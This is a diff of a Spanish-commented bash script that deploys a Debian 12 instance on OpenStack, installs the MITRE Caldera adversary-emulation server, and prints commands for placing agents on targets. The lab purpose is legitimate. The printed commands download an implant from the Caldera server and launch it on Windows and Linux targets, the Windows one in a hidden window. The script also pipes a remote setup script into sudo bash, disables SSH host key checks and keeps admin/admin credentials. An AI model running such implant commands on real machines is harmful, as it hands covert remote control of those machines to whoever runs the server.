@@ -1,19 +1,11 @@
 #!/bin/bash
 # ==========================================
-#  Descripción: Despliega una instancia
-#  Debian 12 en OpenStack e instala MITRE Caldera
+# Despliega una instancia Debian 12 + MITRE Caldera
 # ==========================================
 
-# ===== Timer global del script =====
+# ===== Timer global =====
 SCRIPT_START=$(date +%s)
-
-# Convertir segundos → "X minutos y Y segundos"
-format_time() {
-    local total=$1
-    local minutes=$((total / 60))
-    local seconds=$((total % 60))
-    echo "${minutes} minutos y ${seconds} segundos"
-}
+format_time() { local total=$1; echo "$((total/60)) minutos y $((total%60)) segundos"; }
 
 echo "============================================="
 echo "    Despliega una instancia en OpenStack:    "
@@ -21,28 +13,28 @@ echo "         Debian 12 + MITRE Caldera           "
 echo "============================================="
 
 # ===== Activar entorno virtual =====
+VENV_DIR="deploy/openstack_venv"
 echo "🔹 Activando entorno virtual de OpenStack..."
-step_start=$(date +%s)
-if [[ -d "openstack-installer/openstack_venv" ]]; then
-    source openstack-installer/openstack_venv/bin/activate
-    echo "[✔] Entorno virtual 'openstack_venv' activado correctamente."
+if [[ -d "$VENV_DIR" ]]; then
+    source "$VENV_DIR/bin/activate"
+    echo "[✔] Entorno virtual activado correctamente: $VENV_DIR"
 else
-    echo "[✖] No se encontró el entorno 'openstack_venv'. Ejecuta primero openstack-recursos.sh"
+    echo "[✖] No se encontró el entorno '$VENV_DIR'. Ejecuta primero deploy/openstack-resources.sh"
     exit 1
 fi
-step_end=$(date +%s)
 echo "-------------------------------------------"
 sleep 1
 
 # ===== Cargar variables de entorno OpenStack =====
-if [[ -f "admin-openrc.sh" ]]; then
-    echo "[+] Cargando variables del entorno OpenStack (admin-openrc.sh)..."
-    source admin-openrc.sh
+OPENRC_FILE="admin-openrc.sh"
+if [[ -f "$OPENRC_FILE" ]]; then
+    echo "[+] Cargando variables del entorno OpenStack ($OPENRC_FILE)..."
+    source "$OPENRC_FILE"
     echo "[✔] Variables cargadas correctamente."
     echo "-------------------------------------------"
     sleep 1
 else
-    echo "[✖] No se encontró 'admin-openrc.sh'. Ejecuta primero openstack-recursos.sh"
+    echo "[✖] No se encontró '$OPENRC_FILE'. Ejecuta primero deploy/openstack-resources.sh"
     exit 1
 fi
 
@@ -61,44 +53,38 @@ ROUTER_NAME="router_private_01"
 
 INSTANCE_NAME="caldera-server"
 SSH_USER="debian"
-SSH_KEY_PATH="$HOME/nics-cyberlab-A/my_key.pem"
-USERDATA_FILE="$HOME/nics-cyberlab-A/set-password.yml"
+SSH_KEY_PATH="$PWD/deploy/keys/${KEY_NAME}.pem"
+USERDATA_FILE="$PWD/deploy/cloud-init/set-password.yml"
 KNOWN_HOSTS_FILE="$HOME/.ssh/known_hosts"
+
+echo "[✔] Keypair privado: $SSH_KEY_PATH"
+echo "[✔] Cloud-init: $USERDATA_FILE"
 
 # =========================
 # VERIFICACIÓN DE RECURSOS
 # =========================
 echo "🔹 Verificando recursos necesarios..."
-
-if ! openstack image list -f value -c Name | grep -qw "$IMAGE_NAME"; then
-    echo "[!] Falta la imagen '$IMAGE_NAME'. Ejecuta openstack-recursos.sh"; exit 1
-fi
-if ! openstack flavor list -f value -c Name | grep -qw "$FLAVOR"; then
-    echo "[!] Falta el flavor '$FLAVOR'. Ejecuta openstack-recursos.sh"; exit 1
-fi
-if ! openstack keypair list -f value -c Name | grep -qw "$KEY_NAME"; then
-    echo "[!] Falta el keypair '$KEY_NAME'. Ejecuta openstack-recursos.sh"; exit 1
-fi
-if [[ ! -f "$SSH_KEY_PATH" ]]; then
-    echo "[!] No se encuentra la clave privada '$SSH_KEY_PATH'."; exit 1
-fi
-if ! openstack security group list -f value -c Name | grep -qw "$SEC_GROUP"; then
-    echo "[!] Falta el grupo de seguridad '$SEC_GROUP'. Ejecuta openstack-recursos.sh"; exit 1
-fi
-if ! openstack network list -f value -c Name | grep -qw "$NETWORK_PRIVATE"; then
-    echo "[!] Falta la red privada '$NETWORK_PRIVATE'."; exit 1
-fi
-if ! openstack subnet list -f value -c Name | grep -qw "$SUBNET_PRIVATE"; then
-    echo "[!] Falta la subred privada '$SUBNET_PRIVATE'."; exit 1
-fi
-if ! openstack router list -f value -c Name | grep -qw "$ROUTER_NAME"; then
-    echo "[!] Falta el router '$ROUTER_NAME'."; exit 1
-fi
-if [[ ! -f "$USERDATA_FILE" ]]; then
-    echo "[!] No se encuentra '$USERDATA_FILE'."; exit 1
-fi
-
-echo "[✔] Todos los recursos necesarios existen."
+for res in \
+    "openstack image list -f value -c Name|grep -qw $IMAGE_NAME:'Imagen $IMAGE_NAME'" \
+    "openstack flavor list -f value -c Name|grep -qw $FLAVOR:'Flavor $FLAVOR'" \
+    "openstack keypair list -f value -c Name|grep -qw $KEY_NAME:'Keypair $KEY_NAME'" \
+    "openstack security group list -f value -c Name|grep -qw $SEC_GROUP:'Grupo de seguridad $SEC_GROUP'" \
+    "openstack network list -f value -c Name|grep -qw $NETWORK_PRIVATE:'Red privada $NETWORK_PRIVATE'" \
+    "openstack subnet list -f value -c Name|grep -qw $SUBNET_PRIVATE:'Subred privada $SUBNET_PRIVATE'" \
+    "openstack router list -f value -c Name|grep -qw $ROUTER_NAME:'Router $ROUTER_NAME'" \
+    "[[ -f $SSH_KEY_PATH ]]:'Clave privada $SSH_KEY_PATH'" \
+    "[[ -f $USERDATA_FILE ]]:'Cloud-init $USERDATA_FILE'"
+do
+    cmd=$(echo $res | cut -d: -f1)
+    msg=$(echo $res | cut -d: -f2)
+    eval $cmd
+    if [[ $? -ne 0 ]]; then
+        echo "[✖] Falta recurso: $msg. Ejecuta deploy/openstack-resources.sh"
+        exit 1
+    else
+        echo "[✔] Recurso existente: $msg"
+    fi
+done
 echo "-------------------------------------------"
 
 # =========================
@@ -106,15 +92,12 @@ echo "-------------------------------------------"
 # =========================
 EXISTING=$(openstack server list -f value -c Name | grep -w "$INSTANCE_NAME")
 if [[ -n "$EXISTING" ]]; then
-    echo "[!] Existe una instancia '$INSTANCE_NAME'. Eliminando..."
+    echo "[!] Existe instancia '$INSTANCE_NAME'. Eliminando..."
     for s in $EXISTING; do openstack server delete "$s"; done
-
     until ! openstack server list -f value -c Name | grep -qw "$INSTANCE_NAME"; do
-        sleep 5
-        echo -n "."
+        sleep 5; echo -n "."
     done
-    echo
-    echo "[✔] Instancia '$INSTANCE_NAME' eliminada."
+    echo; echo "[✔] Instancia '$INSTANCE_NAME' eliminada."
 fi
 
 # =========================
@@ -132,11 +115,9 @@ openstack server create \
 
 echo "[+] Esperando que la instancia esté ACTIVE..."
 until [[ "$(openstack server show "$INSTANCE_NAME" -f value -c status)" == "ACTIVE" ]]; do
-    sleep 5
-    echo -n "."
+    sleep 5; echo -n "."
 done
-echo
-echo "[✔] Instancia '$INSTANCE_NAME' activa."
+echo; echo "[✔] Instancia '$INSTANCE_NAME' activa."
 
 # =========================
 # IP FLOTANTE
@@ -145,112 +126,134 @@ FLOATING_IP=$(openstack floating ip list -f value -c "Floating IP Address" -c "F
 if [[ -z "$FLOATING_IP" ]]; then
     FLOATING_IP=$(openstack floating ip create "$NETWORK_EXTERNAL" -f value -c floating_ip_address)
 fi
-
 ssh-keygen -f "$KNOWN_HOSTS_FILE" -R "$FLOATING_IP" >/dev/null 2>&1
 openstack server add floating ip "$INSTANCE_NAME" "$FLOATING_IP"
 
+echo "[✔] IP flotante asignada: $FLOATING_IP"
+
 # =========================
-# ESPERA SSH (1 MINUTO)
+# ESPERA SSH
 # =========================
-echo "[+] Esperando conexión SSH (Puede tardar un momentito)..."
+echo "[+] Esperando conexión SSH..."
 SSH_TIMEOUT=60
 SSH_START=$(date +%s)
-
 until ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" "echo ok" >/dev/null 2>&1; do
-    sleep 5
-    echo -n "."
+    sleep 5; echo -n "."
     NOW=$(date +%s)
     if (( NOW - SSH_START > SSH_TIMEOUT )); then
-        echo
-        echo "[✖] Timeout al intentar conectar por SSH"
-        exit 1
+        echo; echo "[✖] Timeout al intentar conectar por SSH"; exit 1
     fi
 done
+echo; echo "[✔] SSH disponible en $FLOATING_IP"
 
-echo
-echo "[✔] SSH disponible en $FLOATING_IP"
-
-# ===============================
-# INSTALACIÓN DE CALDERA (TIMER)
-# ===============================
+# =========================
+# INSTALACIÓN CALDERA
+# =========================
 INSTALL_START=$(date +%s)
-
 ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<'EOF'
 set -e
 
-sudo apt update
-sudo apt upgrade -y
-sudo apt autoremove --purge -y
-sudo apt autoclean -y
+# ===============================
+# ACTUALIZACIÓN Y DEPENDENCIAS
+# ===============================
+echo "🔹 Actualizando índices de paquetes..."
+sudo DEBIAN_FRONTEND=noninteractive apt update
+echo "🔹 Actualizando paquetes..."
+sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y
 
-sudo apt install -y python3 python3-pip curl git build-essential
+sudo apt install -y python3 python3-venv python3-pip curl git build-essential
 
-# Node.js 20
+# ===============================
+# NODE.JS 20
+# ===============================
 curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
 sudo apt install -y nodejs
 
-# Clonar Caldera
+# ===============================
+# CALDERA Y VIRTUALENV
+# ===============================
 cd ~
-git clone https://github.com/mitre/caldera.git --recursive || true
+# Clonar Caldera si no existe
+if [[ ! -d "caldera" ]]; then
+    git clone https://github.com/mitre/caldera.git --recursive
+fi
 
-# Plugin Magma
+# Crear virtualenv si no existe
+if [[ ! -d "caldera_venv" ]]; then
+    python3 -m venv ~/caldera_venv
+fi
+
+# Activar virtualenv
+source ~/caldera_venv/bin/activate
+
+# Actualizar pip dentro del virtualenv
+pip install --upgrade pip
+
+# Instalar requerimientos Python
+pip install --break-system-packages -r ~/caldera/requirements.txt
+
+# ===============================
+# PLUGIN MAGMA
+# ===============================
 cd ~/caldera/plugins/magma
 rm -rf node_modules package-lock.json
 npm install vite@2.9.15 @vitejs/plugin-vue@2.3.4 vue@3.2.45 --legacy-peer-deps
 
-# Requisitos Python
-cd ~/caldera
-sudo pip3 install --break-system-packages -r requirements.txt
+# ===============================
+# FIN DEL BLOQUE DE INSTALACIÓN
+# ===============================
 EOF
 
 INSTALL_END=$(date +%s)
-INSTALL_TIME=$((INSTALL_END - INSTALL_START))
-
 echo "[✔] Caldera instalado y configurado."
-echo "[⏱] Tiempo de instalación: $(format_time $INSTALL_TIME)"
-echo "[✔] IP flotante asignada: $FLOATING_IP"
+echo "[⏱] Tiempo de instalación: $(format_time $((INSTALL_END-INSTALL_START)))"
 
-echo
-echo "🔹 Iniciando servidor Caldera (se compilará en segundo plano)..."
+# ===============================
+# INICIAR CALDERA EN SEGUNDO PLANO
+# ===============================
+echo "🔹 Iniciando servidor Caldera en segundo plano..."
 
-ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<EOF
+ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<'EOF'
+# Activar virtualenv antes de arrancar el servidor
+source ~/caldera_venv/bin/activate
 cd ~/caldera
 nohup python3 server.py --insecure --build > caldera.log 2>&1 &
 EOF
+sleep 20
 
-# ========================================
-# TIEMPO TOTAL DEL SCRIPT
-# ========================================
+# =========================
+# TIEMPO TOTAL SCRIPT
+# =========================
 SCRIPT_END=$(date +%s)
-SCRIPT_TIME=$((SCRIPT_END - SCRIPT_START))
-
 echo "===================================================="
-echo "[⏱] Tiempo TOTAL del script: $(format_time $SCRIPT_TIME)"
+echo "[⏱] Tiempo TOTAL del script: $(format_time $((SCRIPT_END-SCRIPT_START)))"
 echo "===================================================="
 
+# =========================
+# INFORMACIÓN FINAL
+# =========================
 echo "Acceso SSH:"
 echo "[➜] ssh -i $SSH_KEY_PATH $SSH_USER@$FLOATING_IP"
 echo "-----------------------------------------------"
 
 CALDERA_SERVER_URL="http://$FLOATING_IP:8888"
-
 echo "Caldera disponible en:"
 echo "[🌐] $CALDERA_SERVER_URL"
 echo "[🔑] Credenciales por defecto: admin / admin"
 
+# =========================
+# COMANDOS AGENTES SANDCAT
+# =========================
 echo
 echo "===================================================="
 echo " COMANDOS PARA DESPLEGAR AGENTES SANDCAT DESDE CALDERA"
 echo "===================================================="
 echo
-echo "👉 Estos comandos se ejecutan EN CADA MÁQUINA OBJETIVO."
-echo
+echo "👉 Ejecutar en cada máquina objetivo"
 
 # --------- Windows (PowerShell) ---------
 cat <<EOWIN
 [ Windows (PowerShell) ]
-
-Copiar y pegar en una consola de PowerShell con privilegios:
 
 \$server = "$CALDERA_SERVER_URL"
 \$url    = "\$server/file/download"
@@ -259,35 +262,18 @@ Copiar y pegar en una consola de PowerShell con privilegios:
 \$wc.Headers.Add("file","sandcat.go")
 \$data   = \$wc.DownloadData(\$url)
 \$path   = "C:\\Users\\Public\\caldera-agent.exe"
-
-# Guardar el agente y lanzarlo en segundo plano
 [io.file]::WriteAllBytes(\$path, \$data) | Out-Null
 Start-Process -FilePath \$path -ArgumentList "-server \$server -group red -v" -WindowStyle hidden
 
 EOWIN
 
-# --------- Ubuntu ---------
-cat <<EOUBU
-[ Ubuntu (bash) ]
-
-Copiar y pegar en la máquina Ubuntu:
+# --------- Linux / Ubuntu / Debian ---------
+cat <<EOLINUX
+[ Linux / Ubuntu / Debian ]
 
 server="$CALDERA_SERVER_URL"
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "\$server/file/download" -o caldera-agent
 chmod +x caldera-agent
 ./caldera-agent -server "\$server" -group red -v
 
-EOUBU
-
-# --------- Debian ---------
-cat <<EODEB
-[ Debian (bash) ]
-
-Copiar y pegar en la máquina Debian:
-
-server="$CALDERA_SERVER_URL"
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "\$server/file/download" -o caldera-agent
-chmod +x caldera-agent
-./caldera-agent -server "\$server" -group red -v
-
-EODEB
+EOLINUX
